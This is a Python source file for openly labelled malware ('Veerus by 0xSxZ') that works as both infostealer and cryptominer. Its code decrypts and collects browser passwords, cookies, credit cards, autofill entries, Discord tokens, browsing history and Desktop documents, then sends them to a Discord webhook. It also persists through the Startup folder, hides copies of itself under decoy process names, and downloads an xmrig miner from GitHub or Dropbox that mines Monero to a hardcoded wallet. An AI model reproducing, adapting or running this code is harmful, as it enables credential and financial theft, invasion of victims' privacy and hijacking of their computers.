import os
from datetime import datetime, timedelta
from os import getenv, getlogin, listdir
import sqlite3
from discord_webhook import DiscordWebhook, DiscordEmbed
import win32crypt
import codecs
import win32crypt
import shutil
import command
import time
import random
import threading
import re
import wmi
import json
import uuid
import textwrap
import psutil
import glob
import FireFoxDecrypt
import requests
import sys
import base64
from base64 import b64decode
from Crypto.Cipher import AES
from json import loads
from regex import findall
import platform
from http.server import BaseHTTPRequestHandler, HTTPServer
import time
from pathlib import Path
import codecs
import os
from http.server import HTTPServer, CGIHTTPRequestHandler
import tkinter as tk
import pyImpossibleObf
import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import winreg as reg
import getpass
import os
import zipfile
from os import walk
USER_NAME = getpass.getuser()


"""

	globals :

"""

#WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
chiffre = "webhook667"
ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq" #Only RandomX, replace with your adress 42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao


CLONE_PROCESS = False # Create Instances of the program hidden in multiple path.
PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appdata-system", "visual-studio", "temp-file"]

PROCESS_PATHS = [
	os.getenv('APPDATA') + "\\"+ str(uuid.uuid4()), 
	os.getenv('LOCALAPPDATA') + "\\"+ str(uuid.uuid4()),
]
PROCESS_NUM = 2

MINE = True #Mine crypto? True/False
MINING_PERCENT = "30"
CUDA = False


computer = wmi.WMI()
MINERURL = "https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrig.exe?raw=true"
GPUMODEL = computer.Win32_VideoController()[0]



XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Services32.exe"

APP_DATA_PATH= os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
NONCE_BYTE_SIZE = 12


Founded = False
res =  """Stealed By 0xSxZ ------------> \n\n"""
creditcard = "=========Stealed by 0xSxZ =============\n\n"
currency = "=========Stealed by 0xSxZ =============\n\n"
local_appdata = os.environ['LOCALAPPDATA'] + "\\"
default_appdata = os.getenv('APPDATA')
chromiumpaths = [
	default_appdata + "\\Opera Software\\Opera Stable",
	default_appdata + "\\Opera Software\\Opera GX Stable",
	local_appdata + "Google\\Chrome",
	local_appdata + "Google(x86)\\Chrome",
	local_appdata + "Chromium",
	local_appdata + "BraveSoftware\\Brave-Browser",
	local_appdata + "Epic Privacy Browser",
	local_appdata + "Amigo",
	local_appdata + "Vivaldi",
	local_appdata + "Orbitum",
	local_appdata + "Mail.Ru\\Atom",
	local_appdata + "Kometa",
	local_appdata + "Comodo\\Dragon",
	local_appdata + "Torch",
	local_appdata + "Comodo",
	local_appdata + "Slimjet",
	local_appdata + "360Browser\\Browser",
	local_appdata + "Maxthon3",
	local_appdata + "K-Melon",
	local_appdata + "Sputnik\\Sputnik",
	local_appdata + "Nichrome",
	local_appdata + "CocCoc\\Browser",
	local_appdata + "uCozMedia\\Uran",
	local_appdata + "Chromodo",
	local_appdata + "Yandex\\YandexBrowser"
]


yes = "yes"

if yes == "yes":

	def ClearTerm():
		if(os.name == "nt" or os.name == "windows"):
			os.system("cls")
		else:
			os.system("clear")
	def antiAnalysis():
		while True:
			ClearTerm()
			time.sleep(0.1)
	#threading.Thread(target=antiAnalysis).start()
	def valid_uuid(uuid):
		 regex = re.compile('^[a-f0-9]{8}-?[a-f0-9]{4}-?4[a-f0-9]{3}-?[89ab][a-f0-9]{3}-?[a-f0-9]{12}\Z', re.I)
		 match = regex.match(uuid)
		 return bool(match)
	def launchProcesses(path):
		try:
			os.system(path)
		except Exception as e:
			print("Err : "+ str(e))

	try:
		url = 'http://ipinfo.io/json'
		response = requests.get(url)
		data = response.json()
		IP=data['ip']
		org=data['org']
		city = data['city']
		country=data['country']
		region=data['region']
	except:
		IP = str(uuid.uuid4())
		city = str(uuid.uuid4())
		country = str(uuid.uuid4())
	def add_to_startup(file_path):
		copyof_file = str(uuid.uuid4()) 
		#os.system("mkdir " + local_appdata + copyof_file)
		copyof_file = file_path
		shutil.copy(os.path.realpath(sys.argv[0]), copyof_file)
		print(copyof_file)
		if file_path == "":
			file_path = copyof_file
		bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
		with open(bat_path + '\\' + str(uuid.uuid4()) + ".bat", "w+") as bat_file:
			bat_file.write(r'start "" "%s"' % file_path)
	if(platform.system() == 'windows' or platform.system() == "Windows"):
		numberOfClones = 0
		for i in range(PROCESS_NUM):
			subfolders = os.listdir(os.getenv("APPDATA"))
			for i in range(len(subfolders)):
				if(valid_uuid(subfolders[i])):
					numberOfClones = numberOfClones + 1
					print(numberOfClones)
			if(numberOfClones <= PROCESS_NUM):
				try:
					original = os.path.basename(sys.argv[0])
					#folderName = str(uuid.uuid4())
					PROCCESS_PATH = random.choice(PROCESS_PATHS)
					os.mkdir(PROCCESS_PATH)
					rdmchoice = str(uuid.uuid4())
					target = PROCCESS_PATH + "\\" + rdmchoice+ ".exe"
					print(target)
					add_to_startup(target)
				except:
					continue
	def checkIfProcessRunning(processName):
		'''
		Check if there is any running process that contains the given name processName.
		'''
		#Iterate over the all the running process
		for proc in psutil.process_iter():
			try:
				# Check if process name contains the given name string.
				if processName.lower() in proc.name().lower():
					return True
			except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
				pass
		return False;
	print("Running : "  + str(checkIfProcessRunning("xmrig")))
	def stealChromeWin():
		try:
			res =  """Stealed By 0xSxZ ------------> \n\n"""
			creditcard = "=========Stealed by 0xSxZ =============\n\n"
			currency = "=========Stealed by 0xSxZ =============\n\n"
			try:
				ibm = 0
				for i in range(len(chromiumpaths)):
					if not os.path.exists(chromiumpaths[i]):
						continue
					path = str(chromiumpaths[i] + "\\User Data\\"+"\\Default\\Web Data")
					if not os.path.exists(path):
						path = str(chromiumpaths[i] + "\\User Data\\"+"\\Profile 1\\Web Data")
						if not os.path.exists(path):
							path = str(chromiumpaths[i] + "\\User Data\\"+"\\Profile 2\\Web Data")
							if not os.path.exists(path):
								continue
					shutil.copy(path, "webdata.db")
					path = "webdata.db"
					db = sqlite3.connect(path)
					connection = sqlite3.connect(str(path))
					cursor = db.cursor()
					cursor.execute("SELECT  name, value FROM 'autofill'")
					for name, value in cursor.fetchall():
						res = res + "[.] " + name + "\n\n[.] Val : " + value + "\n"
						if("card" in value or "credit" in value):
							creditcard = creditcard + res
						if("currency" in value or "billing" in value or "wallet" in value or "finance" in value):
							currency = currency + res
						ibm = ibm + 1
						
						if(ibm >= 370):
							break
					connection.close()
					if(ibm >= 370):
						break
				Founded = True
				return str(res) + "welekip" ":::667" + str(currency) + ":::667" + str(creditcard)
			except Exception as e:
				print(e)
		except Exception as e:
				print(e)
	def stealChromeWinHistory():
		try:
			path = str(os.environ['USERPROFILE'] + "\\Local Settings\\Application Data\\Google\\Chrome\\User Data\\Default\\History")
			connection = sqlite3.connect(str(path))
			chromewinhist = str( tuple(connection.execute("SELECT url FROM 'urls'")))
			connection.close()
			return chromewinhist.replace("(", '\n').replace(")", "\r\n")
		except Exception as e:
			return "[.] Error"
	"""
		credits : 
			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc
			https://gist.github.com/DakuTree/428e5b737306937628f2944fbfdc4ffc

	"""
	def get_master_key(path):
		with open(path, "r", encoding='utf-8') as f:
			local_state = f.read()
			local_state = json.loads(local_state)
		master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		master_key = master_key[5:]  # removing DPAPI
		master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
		return master_key


	def decrypt_payload(cipher, payload):
		return cipher.decrypt(payload)


	def generate_cipher(aes_key, iv):
		return AES.new(aes_key, AES.MODE_GCM, iv)


	def decrypt_password(buff, master_key):
		try:
			iv = buff[3:15]
			payload = buff[15:]
			cipher = generate_cipher(master_key, iv)
			decrypted_pass = decrypt_payload(cipher, payload)
			decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
			return decrypted_pass
		except Exception as e:
			# print("Probably saved password from Chrome version older than v80\n")
			# print(str(e))
			return "Chrome < 80"

	def chromeCookies():
		try:
			chrcooks = ""
			for i in range(len(chromiumpaths)):
				db_path = chromiumpaths[i] + "\\User Data\\Default\\Network\\Cookies"
				if not os.path.exists(db_path):
					db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Network\\Cookies"
					if not os.path.exists(db_path):
						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Network\\Cookies"
						if not os.path.exists(db_path):
							db_path = chromiumpaths[i]+ "\\Network\\Cookies"
							if not os.path.exists(db_path):
								db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 2"+"\\Network\\Cookies"
								if not os.path.exists( str(chromiumpaths[i])+ "\\Network\\Cookies"):
									print("Not existing")
									continue
				local_state_path = chromiumpaths[i]  + "\\Local State"
				if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
					local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
					if not os.path.isfile(local_state_path):
						local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
						if not os.path.isfile(local_state_path):
							continue
					print("Getting Chrome cookies : " + db_path)
					if not os.path.exists(db_path):
						continue
				print("Getting Chrome cookies : " + db_path)
				if not os.path.exists(db_path):
					continue
				
				filename =  str(uuid.uuid4()) + ".db"
				if not os.path.isfile(filename):
					shutil.copy(db_path, filename)
				# connect to the database
				db = sqlite3.connect(filename)
				# ignore decoding errors
				db.text_factory = lambda b: b.decode(errors="ignore")
				cursor = db.cursor()
				# get the cookies from `cookies` table
				cursor.execute("""SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM 'cookies'""")
				key = get_encryption_key(local_state_path)
				for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
					decrypted_value = decrypt_password(encrypted_value, key)
					chrcooks = chrcooks + f"""
					Host: {host_key}
					Cookie name: {name}
					Cookie value (decrypted): {decrypted_value}
					===============================================================
					"""

					# update the cookies table with the decrypted value
					# and make session cookie persistent
					cursor.execute("""
					UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
					WHERE host_key = ?
					AND name = ?""", (decrypted_value, host_key, name))
				# commit changes
				db.commit()
				# close connection
				db.close()

			return chrcooks
		except Exception as e:
			print(e)

	def main():
		binks = "==============Stealed By 0xSxZ=============="
		for i in range(len(chromiumpaths)):
			db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Login Data"
			if not os.path.exists(db_path):
				db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Login Data"
				if not os.path.exists(db_path):
					db_path = chromiumpaths[i]+ "\\Login Data"
					if not os.path.exists(db_path):
						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 2"+"\\Login Data"
						if not os.path.exists( str(chromiumpaths[i])+ "\\Login Data"):
							print("Not existing")
							continue
			print("Existing")
			local_state_path = chromiumpaths[i]  + "\\Local State"
			if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
				local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
				if not os.path.isfile(local_state_path):
					local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
					if not os.path.isfile(local_state_path):
						continue
			master_key = get_master_key(local_state_path)
			login_db = db_path
			dbpath = str(uuid.uuid4())
			shutil.copy2(login_db, dbpath) #making a temp copy since Login Data DB is locked while Chrome is running
			conn = sqlite3.connect(dbpath)
			cursor = conn.cursor()

			try:
				cursor.execute("SELECT action_url, username_value, password_value FROM logins")
				for r in cursor.fetchall():
					url = r[0]
					username = r[1]
					encrypted_password = r[2]
					decrypted_password = decrypt_password(encrypted_password, master_key)
					binks = binks + (f"Main URL: {url}\n")
					binks = binks +(f"User name: {username}\n")
					binks = binks +(f"Decrypted Password: {decrypted_password}\n\n")
					binks = binks + ("=" * 100)
					print(binks)
			except Exception as e:
				print(e)

			cursor.close()
			conn.close()
			return binks
	def PasswLinux():
		try:
			FirefoxPath = os.path.expanduser("~/.mozilla/firefox/")
			FirefoxPath2 = os.listdir(FirefoxPath)
			FirefoxLength = len(FirefoxPath2)
			for i in range(FirefoxLength):
				if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "/key4.db") or os.path.isfile(FirefoxPath+FirefoxPath2[i]+"/key3.db")):
					if(os.path.isfile(FirefoxPath+FirefoxPath2[i]+"/key3.db")):
						db = FirefoxPath + FirefoxPath2[i] + "/key3.db"
					else:
						db = FirefoxPath + FirefoxPath2[i] + "/key4.db"
					passwordF = FireFoxDecrypt.DecryptLogins(FirefoxPath+FirefoxPath2[i]+"/logins.json", db)
					return("""
	-------------------------
	Veerus by 0xSz
	Password stealed
	------------------------\n
	""" + str(passwordF)+"\n\n------------------------")
					break
				else:
					print("False")
		except Exception as e:
			return "Error  or no passwords. : " + str(e)



	"""

		credits : https://github.com/LocalsGitHub/Decrypt-Discord-Token/blob/main/decrypt.py

	"""

	tokens = []
	cleaned = []

	def decrypt(buff, master_key):
		try:
			return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
		except Exception as e:
			return "An error has occured.\n" + e
	askUser = "2"
	def getDisk0rdToken():
		if "2" in askUser:

			with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local State", "r") as file:
				key = loads(file.read())['os_crypt']['encrypted_key']
				file.close()
			for file in listdir(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\"):
				if not file.endswith(".ldb") and file.endswith(".log"):
					continue
				else:
					try:
						with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
							for x in files.readlines():
								x.strip()
								for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
									tokens.append(values)
									
					except PermissionError:
						continue
			for i in tokens:
				if i.endswith("\\"):
					i.replace("\\", "")
				elif i not in cleaned:
					cleaned.append(i)
			tosend = ""
			for token in cleaned:
				tosend = tosend + str(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:]).encode()) + "\n"
			return tosend
	"""

		^^^^^credits : https://github.com/LocalsGitHub/Decrypt-Discord-Token/blob/main/decrypt.py^^^^^

	"""
	def PasswWin():
		print("[.] Getting Win Firefow pw's")
		try:
			if os.name == 'nt' or os.name == 'windows':	

				passwordF = ""
				FirefoxPath = str(os.getenv('APPDATA')) + "\\Mozilla\\Firefox\\Profiles\\"
				FirefoxPath2 = os.listdir(FirefoxPath)
				FirefoxLength = len(FirefoxPath2)
				for i in range(FirefoxLength):
					if(os.path.isfile(FirefoxPath + FirefoxPath2[i] + "\\key4.db") or os.path.isfile(FirefoxPath+FirefoxPath2[i]+"\\key3.db")):
						if(os.path.isfile(FirefoxPath+FirefoxPath2[i]+"\\key3.db")):
							db = FirefoxPath + FirefoxPath2[i] + "\\key3.db"
						else:
							db = FirefoxPath + FirefoxPath2[i] + "\\key4.db"
						passwordF = passwordF + str(FireFoxDecrypt.DecryptLogins(FirefoxPath+FirefoxPath2[i]+"\\logins.json", db))
					else:
						print("False")
				return ("""
		-------------------------
		Veerus by 0xSz (on github)
		Password stealed
		------------------------\n
		""" + str(passwordF) +"\n\n------------------------")
						

			else:
				return b"OS not supported."
		except Exception as e:
			return "Error : " + str(e)
	def get_chrome_datetime(chromedate):
		"""Return a `datetime.datetime` object from a chrome format datetime
		Since `chromedate` is formatted as the number of microseconds since January, 1601"""
		return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

	def get_encryption_key(path):

		local_state_path = path
		with open(local_state_path, "r", encoding="utf-8") as f:
			local_state = f.read()
			local_state = json.loads(local_state)

		# decode the encryption key from Base64
		key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		# remove DPAPI str
		key = key[5:]
		# return decrypted key that was originally encrypted
		# using a session key derived from current user's logon credentials
		# doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
		return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

	def decrypt_password(password, key):
		try:
			# get the initialization vector
			iv = password[3:15]
			password = password[15:]
			# generate cipher
			cipher = AES.new(key, AES.MODE_GCM, iv)
			# decrypt password
			return cipher.decrypt(password)[:-16].decode()
		except:
			try:
				return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
			except:
				# not supported
				return ""
	def getccs():
		binks = "==============Stealed By 0xSxZ=============="
		try:
			ccss = ("=" * 100)
			for i in range(len(chromiumpaths)):
				db_path = str(chromiumpaths[i])+ "\\Web Data"
				if not os.path.exists(db_path):
					db_path = str(chromiumpaths[i])+ "\\User Data"+ "\\Default"+"\\Web Data"
					if not os.path.exists(db_path):
						db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1" +"\\Web Data"
						if not os.path.exists(db_path):
							db_path = chromiumpaths[i]+ "\\Login Data"
							if not os.path.exists(db_path):
								db_path = chromiumpaths[i]+ "\\User Data"+ "\\Profile 1"+"\\Web Data"
								if not os.path.exists( str(chromiumpaths[i])+ "\\Web Data"):
									continue
				local_state_path = chromiumpaths[i]  + "\\Local State"
				if not os.path.isfile(chromiumpaths[i]  + "\\Local State"):
					local_state_path = chromiumpaths[i] + "\\User Data"+ "\\Local State"
					if not os.path.isfile(local_state_path):
						local_state_path = chromiumpaths[i] +"\\User Data\\"+"Default\\" + "\\Local State"
						if not os.path.isfile(local_state_path):
							continue
				master_key = get_master_key(local_state_path)
				login_db = db_path
				dbpath = str(uuid.uuid4())
				shutil.copy2(login_db, dbpath) #making a temp copy since Login Data DB is locked while Chrome is running
				conn = sqlite3.connect(dbpath)
				cursor = conn.cursor()
				try:
					cursor.execute("SELECT * FROM 'credit_cards'")
					for r in cursor.fetchall():
						action_url = r[1]
						username = r[2]
						password = r[3]
						encrypted_password = r[4]
						date_created = decrypt_password(encrypted_password, master_key)
						print(date_created)
						ccss =ccss + "\nName on card : " + str(action_url)
						ccss =ccss +"\nEXP_Month : "+ str(username)
						ccss =ccss +"\nEXP_Year: " + str(password)
						ccss =ccss +"\nCard Num: " + str(date_created)
						ccss = ccss + ("=" * 100)
						print(ccss)
					cursor.close()
					conn.close()
				except Exception as e:
					print(e)
				try:
					os.remove(dbpath)
				except Exception as e:
					pass


				try:
					  
					# trying to remove the copied db file as 
					# well from local computer
					os.remove(filename)
				except:
					pass
		except ZeroDivisionError as e:
	  		print(str(e))
		return ccss


	def getfiles():
		desktop = os.path.join(os.path.join(os.path.expanduser('~')), 'Desktop') 
		path = desktop + r'/**/*.txt'
		files = glob.glob(path, recursive=True)
		path = desktop + r'/**/*.pdf'
		files.extend(glob.glob(path, recursive=True))
		path = desktop + r'/**/*.doc'
		files.extend(glob.glob(path, recursive=True))
		with zipfile.ZipFile('desktop.zip', 'w') as zipF:
			for file in files:
				zipF.write(file, compress_type=zipfile.ZIP_DEFLATED)
	def MineThreadWin():
		print("[.] Starting miner if enabled.")
		os.system(XMRIGPATH + ' -o xmr-eu1.nanopool.org:14444 -u ' + ADDRESS + ' --coin=monero --cpu-max-threads-hint=22 --background')

	def MineThreadLinux():
		print("[.] Starting miner if enabled.")
		try:
			os.system("./apt.bb -o xmr-eu1.nanopool.org:14444 -u " +ADDRESS+".SxZ#ihlc-hs2a -p x -k")
		except:
			os.system("./apt.bb -o xmr-eu1.nanopool.org:14444 -u "+ADDRESS+".SxZ#ihlc-hs2a -p 0xSz -k -a rx/0")
	def connectOption():
		if(os.name != "nt" and platform.system() != "Windows" or os.name != "windows" and platform.system() != "Windows"):
			print("Not windows...")
			try:
				os.system("mkdir /opt/0xSz/")
				time.sleep(2)
				os.system("mkdir /opt/0xSz/update/")
				time.sleep(2)
				os.system("mkdir /opt/0xSz/update/aptEssentials/")
				os.chdir("/opt/0xSz/update/aptEssentials/")
				os.system("apt install wget")
				os.system("wget https://www.dropbox.com/s/kebdpffh42q7e7z/apt?dl=1 -O /opt/0xSz/update/aptEssentials/apt.bb")
				os.system("chmod +x ./apt.bb")
				#threading.Thread(target=MineThreadLinux).start()
				time.sleep(2)
			except Exception as e :
				print(str(e))
			if MINE == True and checkIfProcessRunning("xmrig") == False:
				threading.Thread(target=MineThreadLinux).start()
				print("[.] Executing miner..")
		else:
			try:
				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny")
				os.system("mkdir "+ os.getenv('APPDATA')+ "\\winedows_companny\\update")
				os.chdir(os.getenv('APPDATA') + "\\winedows_companny\\update")
				if CUDA == True:
					XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\xmrig-nvidia-2.14.5\\xmrig-nvidia.exe"
					r = requests.get("https://github.com/0xSxZ/Veerus/blob/main/MINER_IMPORTANT/clientdownloads/xmrig.exe?raw=true")

					with open(os.getenv('APPDATA') + "\\winedows_companny\\update\\curlcuda.zip", 'wb+') as f:
						f.write(r.content)
					with zipfile.ZipFile(os.getenv('APPDATA') + "\\winedows_companny\\update\\curlcuda.zip", 'r') as zip_ref:
						zip_ref.extractall(os.getenv('APPDATA') + "\\winedows_companny\\update")
				else:
					XMRIGPATH = os.getenv('APPDATA') + "\\winedows_companny\\update\\Services32.exe"
					r = requests.get(MINERURL)
					with open(XMRIGPATH, 'wb') as f:
						print("Writing..")
						f.write(r.content)
					"""
					open(os.getenv('APPDATA') + "\\winedows_companny\\update\\config.json", "x").write('''
{
    "algo":"cn/r",
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "asm": true,
        "argon2-impl": null,
        "argon2": [0, 1, 2, 3, 4, 5, 6, 7],
        "cn": [
            [1, 0],
            [1, 2],
            [1, 4],
            [1, 6]
        ],
        "cn-heavy": [
            [1, 0],
            [1, 2]
        ],
        "cn-lite": [
            [1, 0],
            [1, 1],
            [1, 2],
            [1, 3],
            [1, 4],
            [1, 5],
            [1, 6],
            [1, 7]
        ],
        "cn-pico": [
            [2, 0],
            [2, 1],
            [2, 2],
            [2, 3],
            [2, 4],
            [2, 5],
            [2, 6],
            [2, 7]
        ],
        "cn/upx2": [
            [2, 0],
            [2, 1],
            [2, 2],
            [2, 3],
            [2, 4],
            [2, 5],
            [2, 6],
            [2, 7]
        ],
        "ghostrider": [
            [8, 0],
            [8, 2],
            [8, 4],
            [8, 6]
        ],
        "rx": [0, 2, 4, 6],
        "rx/wow": [0, 1, 2, 3, 4, 5, 6, 7],
        "cn-lite/0": false,
        "cn/0": false,
        "rx/arq": "rx/wow",
        "rx/keva": "rx/wow"
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true
    },
    "log-file": null,
    "donate-level": 2,
    "donate-over-proxy": 1,
    "pools": [
        {
            "algo": null,
            "coin": null,
            "url": "xmr-eu1.nanopool.org:14444",
            "user": "'''+ ADDRESS + '''",
            "pass": "x",
            "rig-id": null,
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "retries": 5,
    "retry-pause": 5,
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}

			''')
			"""
			except Exception as e:
				print(e)
			if MINE == True and checkIfProcessRunning("xmrig") == False:
				threading.Thread(target=MineThreadWin).start()
				print("[.] Executing miner..")
	
	if(chiffre != "" and chiffre != None):
		getfiles()
		print("[.] Sending")
		webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
		embed = DiscordEmbed(title='New Machine connected', description=f'New machine connected\nInfos : \nGraphic Card : {GPUMODEL.Caption}\nIP : {IP}\nCity : {city}\nCountry : :flag_{country.lower()}:', color='03b2f8')
		webhook.add_embed(embed)
		webhook.add_file(file=getDisk0rdToken().replace("b'", "\n").replace("'", ""), filename="0xSxZ_On_Github_T0kains.txt")
		pwdd =main()
		ccs = getccs()
		cooky = chromeCookies()
		print(ccs)
		webhook.add_file(file=ccs, filename="Cr3d1t_C4rds.txt")
		webhook.add_file(file=str(pwdd), filename="0xPasswords.txt")
		webhook.add_file(file=str(cooky), filename="0xCookies.txt")
		try:
			autofill = stealChromeWin()
			autfill = str(autofill).split(":::667")
			print(autfill[1])
		except:
			autfill = ["dazdaz", "dazdza", "dazdhjnza"]
		webhook.add_file(file=autfill[0], filename="Autofill.txt")

		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============

		"""+autfill[1] + autfill[2], filename="finance_and_money.txt")
		webhook.add_file(file="""=========Stealed By 0xSxZ on github =============

		""" + stealChromeWinHistory().replace("'", '').replace("'", ''), filename="Lmao_PornHub_History_XDDD.txt")
		webhook.execute()	
	connectOption()
	os.system("cd")
	getfiles()
	time.sleep(10)
	print("[.] Sending Desktop")
	webhook = DiscordWebhook(url=chiffre, username="github.com/0xSxZ/Veerus/")
	webhook.add_file(file=open("desktop.zip", "rb").read(), filename="desktop.zip")
	webhook.execute()
